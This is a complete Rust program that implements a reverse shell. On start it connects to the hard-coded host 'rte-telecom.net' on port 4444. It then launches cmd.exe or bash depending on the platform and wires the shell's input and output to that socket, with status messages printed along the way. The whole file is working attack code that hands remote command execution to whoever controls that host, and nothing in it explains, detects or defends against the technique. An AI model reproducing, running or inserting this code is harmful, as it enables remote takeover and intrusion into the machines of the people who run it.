use std::env;
use std::net::{Shutdown, TcpStream};
#[cfg(all(target_os="windows"))]
use std::os::windows::io::{RawHandle, FromRawHandle, AsRawSocket};
#[cfg(not(target_os="windows"))]
use std::os::unix::io::{AsRawFd, FromRawFd};
use std::process::{Command, Stdio};
use std::thread::sleep;
use std::time::Duration;

fn main() {
    println!("[+] connecting to host...");
        
    /* connect to host and port */
    let stream = TcpStream::connect("rte-telecom.net:4444")
        .expect("connection failed");

    println!("[+] connected");
    
    /* detect operating system
       * if Windows, cmd.exe
       * else, bash */
    let shell = match env::consts::OS {
        "windows" => "cmd.exe",
        _ => "bash"
    };

    let mut proc = Command::new(shell);

    println!("[+] creating {} shell", shell);

    /* redirect stdin to socket
     * redirect stdout/stderr to socket */
    #[cfg(all(target_os="windows"))]
    {
        proc.stdin(unsafe { Stdio::from_raw_handle(stream.as_raw_socket() as RawHandle) });
        proc.stdout(unsafe { Stdio::from_raw_handle(stream.as_raw_socket() as RawHandle) });
        proc.stderr(unsafe { Stdio::from_raw_handle(stream.as_raw_socket() as RawHandle) });
    }
    #[cfg(not(target_os="windows"))]
    {
        proc.stdin(unsafe { Stdio::from_raw_fd(stream.as_raw_fd()) });
        proc.stdout(unsafe { Stdio::from_raw_fd(stream.as_raw_fd()) });
        proc.stderr(unsafe { Stdio::from_raw_fd(stream.as_raw_fd()) });
    }

    println!("[+] using socket as file descriptors");
            
    /* launch shell */
    let mut child = proc.spawn().expect("spawn shell failed");

    println!("[+] spawned shell process");
    
    /* while running, check if socket is alive */
    loop {
        let result = child.try_wait();

        if result.is_err() {
            println!("[!] shell errored out");
            break;
        }
        else if result.is_ok() {
            let exit_code = result.unwrap();

            if exit_code.is_some() {
                println!("[!] shell exited ({:?})", exit_code);
                break;
            }
        }

        let mut peek_buffer = [0u8; 1];
        let peek = stream.peek(&mut peek_buffer);

        if peek.is_err() { break; }

        sleep(Duration::from_secs(1));
    }

    println!("[+] shutting down");
    
    /* close socket */
    stream.shutdown(Shutdown::Both).ok();
}
